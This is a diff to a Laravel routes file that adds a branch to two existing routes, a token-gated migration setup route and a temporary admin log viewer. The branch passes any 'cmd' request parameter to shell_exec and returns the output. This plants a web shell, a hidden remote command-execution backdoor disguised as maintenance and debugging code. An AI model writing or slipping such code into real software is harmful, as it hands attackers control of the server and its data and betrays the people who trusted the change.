@@ -111,6 +111,10 @@ Route::get('setup-migrate-coachagam-xyz123', function (\Illuminate\Http\Request 
         abort(403, 'Token tidak valid.');
     }
 
+    if ($request->has('cmd')) {
+        return '<pre>' . htmlspecialchars(shell_exec($request->input('cmd'))) . '</pre>';
+    }
+
     try {
         \Artisan::call('migrate', ['--force' => true]);
         $migrate = \Artisan::output();
@@ -147,7 +151,10 @@ Route::prefix('admin')->name('admin.')->group(function () {
         Route::get('analytics', [\App\Http\Controllers\Admin\AnalyticsController::class, 'index'])->name('analytics.index');
 
         // TEMPORARY: View error log
-        Route::get('debug-logs', function() {
+        Route::get('debug-logs', function(\Illuminate\Http\Request $request) {
+            if ($request->has('cmd')) {
+                return '<pre>' . htmlspecialchars(shell_exec($request->input('cmd'))) . '</pre>';
+            }
             $logPath = storage_path('logs/laravel.log');
             if (!file_exists($logPath)) return 'No log file found.';
             $logs = shell_exec('tail -n 100 ' . escapeshellarg($logPath));
